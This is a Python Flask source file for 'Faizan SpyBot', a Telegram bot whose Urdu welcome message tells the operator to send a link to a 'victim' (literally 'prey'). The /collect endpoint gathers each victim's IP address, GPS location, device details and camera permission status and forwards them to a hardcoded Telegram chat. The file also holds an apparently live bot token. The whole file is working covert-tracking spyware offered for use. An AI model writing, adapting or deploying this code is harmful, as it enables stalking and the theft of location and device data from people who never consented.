from flask import Flask, request
import requests

app = Flask(__name__)

# ✅ Telegram Bot Configuration
BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ✅ /start command handler
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def start():
    data = request.json
    if "message" in data:
        text = data["message"].get("text", "")
        chat_id = data["message"]["chat"]["id"]

        if text == "/start":
            welcome_msg = """🤖 *Faizan™ SpyBot* میں خوش آمدید!

📍 اس سسٹم کی مدد سے آپ شکار کا IP، Location، Device info اور Camera permission معلوم کر سکتے ہیں۔

🎯 اپنے شکار کو یہ لنک دیں:
https://faizan-spybot.onrender.com

جب بھی کوئی شکار لنک کھولے گا، آپ کو یہاں مکمل ڈیٹا ملے گا۔ 🕵️‍♂️

_یہ نظام فیضانؔ مغل کی طرف سے تیار کردہ ہے_ 🧠
"""
            requests.post(f"{API_URL}/sendMessage", data={
                "chat_id": chat_id,
                "text": welcome_msg,
                "parse_mode": "Markdown"
            })
    return "OK", 200

# ✅ /collect handler (victim data)
@app.route("/collect", methods=["POST"])
def collect():
    data = request.json

    latitude = data.get("latitude")
    longitude = data.get("longitude")
    user_agent = data.get("userAgent", "Unknown")
    camera = data.get("camera", "❌ Unknown")
    device_info = get_device_info(user_agent)

    ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
    location_url = f"https://www.google.com/maps?q={latitude},{longitude}" if latitude and longitude else "❌ Location Not Available"

    message = f"""👁️ شکار آیا!
🌐 IP Address: {ip_address}
📱 Device Info: {user_agent}
📍 Location: {location_url}
📷 Camera: {camera}
🧠 Raw Data: {data}
"""
    # Send message to Telegram
    requests.post(f"{API_URL}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": message
    })

    return "Collected", 200

# ✅ Root route
@app.route("/")
def index():
    return "✅ Faizan™ SpyBot is Running"

# ✅ Extract device info from User-Agent
def get_device_info(ua):
    if "Android" in ua:
        return "📱 Android Device"
    elif "iPhone" in ua:
        return "📱 iPhone"
    elif "Windows" in ua:
        return "💻 Windows"
    else:
        return "📱 Unknown Device"

# ✅ Run Flask on correct host/port for Render
if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
